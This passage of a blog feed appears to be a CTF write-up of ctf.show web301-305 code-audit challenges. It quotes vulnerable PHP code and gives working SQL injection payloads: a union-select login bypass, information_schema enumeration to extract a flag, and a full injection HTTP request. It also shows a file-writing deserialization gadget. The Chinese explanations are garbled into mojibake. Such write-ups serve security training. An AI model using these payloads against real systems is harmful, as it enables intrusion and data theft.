punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"end"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span><span class="token constant">R</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-‰ª£Á†ÅÂÆ°ËÆ°</title>
      <link href="/2024/08/15/web%E5%85%A5%E9%97%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2024/08/15/web%E5%85%A5%E9%97%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="web301-310"><a href="#web301-310" class="headerlink" title="web301-310"></a>web301-310</h3><h4 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$userpwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select sds_password from sds_user where sds_username='"</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token operator">.</span><span class="token string double-quoted-string">"' order by id limit 1;"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_BOTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Ê≤°Êúâ‰ªª‰ΩïËøáÊª§</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span>checklogin<span class="token operator">.</span>phpuserid<span class="token operator">=</span><span class="token number">1</span>' union select <span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>userpwd<span class="token operator">=</span><span class="token number">1</span></code></pre><h4 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h4><p>Hint:</p><pre class="language-php" data-language="php"><code class="language-php">‰øÆÊîπÁöÑÂú∞ÊñπÔºö<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"># fun.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ÊåâÁÖßÂêåÊ†∑ÈÄªËæëÊûÑÈÄ†Âç≥ÂèØ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// string(32) "d9c77c4e454869d5d8da3b4be79694d3"</span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span>checklogin<span class="token operator">.</span>phpuserid<span class="token operator">=</span><span class="token number">1</span><span class="token string single-quoted-string">' union select '</span>d9c77c4e454869d5d8da3b4be79694d3' <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>userpwd<span class="token operator">=</span><span class="token number">1</span></code></pre><h4 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h4><p>checklogin.phpÈôêÂà∂‰∫ÜuseridÁöÑÈïøÂ∫¶</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>fun.phpÂíåsds_user.sqlÁªô‰∫ÜÂº±ÂØÜÁ†ÅÊèêÁ§∫ <code>admin/admin</code></p><pre class="language-php" data-language="php"><code class="language-php"># fun.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 27151b7b1ad51a38ea66b1529cde5ee4</span><span class="token delimiter important">?></span></span># sds_user.sql-- ------------------------------ Records of sds_user-- ----------------------------INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');</code></pre><pre class="language-php" data-language="php"><code class="language-php"># dptadd.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token comment">//Ê≥®ÂÖ•ÁÇπ</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$dpt_name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_address</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_build_year</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_has_cert</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"on"</span><span class="token operator">?</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span><span class="token variable">$dpt_cert_number</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_telephone_number</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set names utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into sds_dpt set sds_name='"</span><span class="token operator">.</span><span class="token variable">$dpt_name</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_address ='"</span><span class="token operator">.</span><span class="token variable">$dpt_address</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_build_date='"</span><span class="token operator">.</span><span class="token variable">$dpt_build_year</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_have_safe_card='"</span><span class="token operator">.</span><span class="token variable">$dpt_has_cert</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_safe_card_num='"</span><span class="token operator">.</span><span class="token variable">$dpt_cert_number</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_telephone='"</span><span class="token operator">.</span><span class="token variable">$dpt_telephone_number</span><span class="token operator">.</span><span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">===</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:dpt.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>È¶ñÂÖàËÆøÈóÆapt.phpÂèØ‰ª•Êñ∞Â¢ûË°®ÂçïÔºåÊñ∞Â¢ûÂêéÊäìÂåÖËøõË°åsqlÊ≥®ÂÖ•</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/dptadd.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">48838e12-353f-4ed4-884e-5480a8bb5207.challenge.ctf.show</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=gd7ltvs2a269115fvk9s234121</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Dnt</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://48838e12-353f-4ed4-884e-5480a8bb5207.challenge.ctf.show/dpt.php</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">204</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>dpt_name=1&amp;dpt_address=1&amp;dpt_build_year=2024-08-01&amp;dpt_has_cert=on&amp;dpt_cert_number=a',sds_telephone=(Payload);%23&amp;dpt_telephone_number=a</code></pre><p>Payload:</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># Êü•Ë°®Âêç  sds_dpt,sds_fl9g,sds_user</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># Êü•ÂàóÂêç  flag</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'sds_fl9g'</span><span class="token comment"># getFlag </span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token string">'sds_fl9g'</span></code></pre><p><img src="web303.png" loading="lazy"></p><h4 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h4><p>Hint:</p><p>Â¢ûÂä†‰∫ÜÂÖ®Â±Äwaf</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">sds_waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|-/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>‰ΩÜÊòØÂÖ∂ÂÆûÊ≤°Êúâ‰∏äwaf„ÄÇÂè™ÊòØÊç¢‰∫Ü‰∏™Ë°®ÂêçÔºåÊää<code>sds_fl9g</code>Êç¢Êàê‰∫Ü<code>sds_flaag</code>ËÄåÂ∑≤„ÄÇÂÖ∂‰ªñÈÉΩÂêå‰∏äÈ¢ò„ÄÇ</p><p>payloadÔºö</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> flag <span class="token keyword">from</span> sds_flaag</code></pre><h4 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">sds_waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\'|\"|\,|\.|\?|\/|\\\|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ËôΩÁÑ∂ËøáÊª§ÂæàÁã†Ôºå‰ΩÜÊòØÂ§ö‰∫Ü‰∏™class.phpÊñá‰ª∂</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ÁÑ∂ÂêéÂú®checklogin.phpÊñá‰ª∂‰∏≠ÂèëÁé∞‰∫ÜÂèçÂ∫èÂàóÂåñÊìç‰Ωú</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'fun.php'</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span><span class="token variable">$user_cookie</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$user_cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$user_cookie</span><span class="token punctuation">)</span><span class="token 